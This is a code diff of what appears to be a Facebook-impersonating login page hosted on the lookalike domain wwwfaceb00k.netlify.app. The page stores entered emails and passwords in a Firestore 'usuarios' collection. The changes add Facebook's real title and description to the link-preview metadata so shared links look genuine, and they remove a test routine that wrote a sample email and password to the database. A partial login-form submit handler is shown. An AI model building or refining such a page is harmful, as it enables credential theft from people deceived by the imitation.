@@ -6,20 +6,20 @@
     <title>Facebook - Login ou Inscreva-se</title>
 
     <!-- Open Graph Tags -->
-    <meta property="og:title" content="Título do seu site">
-    <meta property="og:description" content="Descrição do seu site">
-    <meta property="og:image" content="https://raw.githubusercontent.com/Paulo-Leão/repositório-teste/main/imagens/vídeo-miniatura.jpg">
-    <meta property="og:url" content="https://wwwfaceb00k.netlify.app/">
+    <meta property="og:title" content="Facebook - Login ou Inscreva-se">
+    <meta property="og:description" content="O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Paulo-Leao/repositorio-teste/main/testeimg/teste123.jpg"> <!-- Link bruto da imagem no GitHub -->
+    <meta property="og:url" content="https://wwwfaceb00k.netlify.app/"> <!-- URL correto do seu site -->
     <meta property="og:type" content="website">
-    
+
     <!-- Twitter Card (Opcional) -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Facebook - Login ou Inscreva-se">
     <meta name="twitter:description" content="O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/Paulo-Leão/repositório-teste/main/imagens/vídeo-miniatura.jpg">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/Paulo-Leao/repositorio-teste/main/testeimg/teste123.jpg"> <!-- Link bruto da imagem no GitHub -->
 
     <style>
-        /* Seus estilos CSS existentes */
+        /* Reset de estilos */
         * {
             margin: 0;
             padding: 0;
@@ -48,7 +48,6 @@
         .left {
             max-width: 500px;
             flex: 1;
-            position: relative;
         }
 
         .left h1 {
@@ -127,7 +126,7 @@
             background-color: #36a420;
         }
 
-        /* Media Queries - Tornando o layout responsivo para dispositivos móveis */
+        /* Media Queries - Responsividade para dispositivos móveis */
         @media (max-width: 768px) {
             .container {
                 flex-direction: column;
@@ -227,22 +226,8 @@
         // Inicializar Firestore
         const db = getFirestore(app);
 
-        // Função para testar a conexão com Firestore
-        async function testarConexao() {
-            try {
-                const usuariosCollection = collection(db, "usuarios");
-                await addDoc(usuariosCollection, {
-                    email: "teste@example.com",
-                    password: "senha123"
-                });
-                console.log("Teste: Documento adicionado com sucesso!");
-            } catch (error) {
-                console.error("Teste: Erro ao adicionar documento: ", error);
-            }
-        }
-
-        // Executar o teste de conexão quando a página carregar
-        window.addEventListener('load', testarConexao);
+        // Removida a função de teste para evitar lotar o banco de dados
+        // Adicione outras funções necessárias aqui, se houver
 
         // Adicionar listener para o evento de submit do formulário
         document.getElementById('login-form').addEventListener('submit', async function(event) {
